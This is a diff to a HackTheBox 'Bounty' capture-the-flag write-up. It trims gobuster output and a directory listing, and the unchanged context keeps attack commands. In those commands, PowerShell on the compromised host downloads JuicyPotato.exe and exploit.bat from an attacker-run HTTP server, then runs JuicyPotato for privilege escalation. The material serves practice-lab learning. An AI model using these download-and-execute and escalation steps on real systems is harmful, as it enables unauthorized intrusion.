@@ -51,21 +51,7 @@ It seems like there’s nothing much here. Lets run `gobuster`!
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bounty]
 └─# gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php,js,html,txt,aspx
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.10.93
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Extensions:              php,js,html,txt,aspx
-[+] Timeout:                 10s
-===============================================================
-2022/07/08 20:27:04 Starting gobuster in directory enumeration mode
-===============================================================
+...
 /transfer.aspx        (Status: 200) [Size: 941]
 /UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]      
 /uploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedFiles/]           
@@ -275,7 +261,6 @@ Now lets craft our plan.
 Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
 10.10.10.93 - - [08/Jul/2022 22:38:35] "GET /JuicyPotato.exe HTTP/1.1" 200 -
 
-
 - Netcat listener -
 PS C:\windows\system32\inetsrv>cd c:\users\merlin\desktop
 PS C:\users\merlin\desktop> (new-object net.webclient).downloadfile('http://10.10.14.23:6969/JuicyPotato.exe', 'C:\Users\merlin\Desktop\jp.exe')
@@ -341,12 +326,6 @@ Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
 
 - Netcat listener -
 PS C:\users\merlin\desktop> (new-object net.webclient).downloadfile('http://10.10.14.23:6969/exploit.bat', 'C:\Users\merlin\Desktop\exploit.bat')
-
-PS C:\users\merlin\desktop> dir
-Mode                LastWriteTime     Length Name                              
-----                -------------     ------ ----                              
--a---          7/8/2022   5:45 PM         99 exploit.bat                       
--a---          7/8/2022   5:38 PM     347648 jp.exe   
 
 PS C:\users\merlin\desktop> ./jp.exe -t * -p exploit.bat -l 9696
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9696
